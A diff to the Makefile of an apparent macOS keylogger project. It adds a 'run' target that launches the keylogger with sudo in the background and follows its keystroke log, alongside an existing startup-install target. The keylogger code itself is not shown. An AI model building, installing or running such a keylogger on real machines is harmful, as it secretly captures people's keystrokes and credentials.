@@ -1,3 +1,4 @@
+# .PHONY: run
 CC=gcc
 CFLAGS=-framework ApplicationServices -framework Carbon
 SOURCES=keylogger.c
@@ -21,3 +22,7 @@ startup: install
 
 clean:
 	rm $(EXECUTABLE)
+
+run: all
+	sudo ./$(EXECUTABLE) &
+	sudo tail -f /var/log/keystroke.log
